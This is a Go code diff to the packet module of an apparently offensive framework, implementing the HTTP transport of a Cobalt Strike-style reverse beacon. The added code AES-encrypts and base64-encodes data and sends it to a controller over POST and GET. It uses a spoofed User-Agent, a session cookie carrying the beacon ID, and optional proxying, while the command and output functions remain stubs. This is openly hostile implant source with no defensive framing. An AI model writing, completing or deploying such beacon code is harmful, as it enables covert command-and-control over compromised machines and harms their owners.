@@ -1,11 +1,12 @@
-package main
+package packet
 
 import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
-	"gosploit-framework/external/module/cc/cobaltstrike/http_reverse_beacon/profile"
+	"fmt"
+	"http_reverse_beacon/profile"
 
 	"github.com/imroc/req"
 )
@@ -40,7 +41,7 @@ func encrypt(plainData []byte) (cipherData []byte) {
 	cipherData = make([]byte, len(plainPadding))
 	blockMode := cipher.NewCBCEncrypter(block, profile.RandomIV)
 	blockMode.CryptBlocks(cipherData, plainPadding)
-	base64.StdEncoding.Encode(cipherData, cipherData)
+	cipherData = []byte(base64.StdEncoding.EncodeToString(cipherData))
 	return cipherData
 }
 
@@ -57,26 +58,46 @@ func decrypt(cipherData []byte) (plainData []byte) {
 	return plainData
 }
 
-func HttpPost(url, id string, data []byte) (resp *req.Resp) {
-	resp, err := httpReqeust.Post(url)
+func HttpPost(url string, data []byte) (resp *req.Resp) {
+	headers := req.Header{
+		"User-Agent": profile.UserAgent,
+		"Accept":     "*/*",
+		"Cookie":     fmt.Sprintf(profile.SessionFormat, profile.SessionID),
+	}
+	if profile.ProxyUrl != "" {
+		httpReqeust.SetProxyUrl(profile.ProxyUrl)
+	}
+	edata := []byte{}
+	if data != nil {
+		edata = encrypt(data)
+	}
+	resp, err := httpReqeust.Post(url, edata, headers)
 	if err != nil {
 		return nil
 	}
 	return resp
 }
 
-func HttpGet(url, cookies string) (resp *req.Resp) {
-	resp, err := httpReqeust.Get(url)
+func HttpGet(url string, data []byte) (resp *req.Resp) {
+	headers := req.Header{
+		"User-Agent": profile.UserAgent,
+		"Accept":     "*/*",
+		"Cookie":     fmt.Sprintf(profile.SessionFormat, profile.SessionID),
+	}
+	if profile.ProxyUrl != "" {
+		httpReqeust.SetProxyUrl(profile.ProxyUrl)
+	}
+	resp, err := httpReqeust.Get(url, headers)
 	if err != nil {
 		return nil
 	}
 	return resp
 }
 
-func GetCommandRequest() *req.Resp {
+func GetCommandRequest() (resp *req.Resp) {
 	return nil
 }
 
-func PostOutputReqeust() *req.Resp {
+func PostOutputReqeust() (resp *req.Resp) {
 	return nil
 }
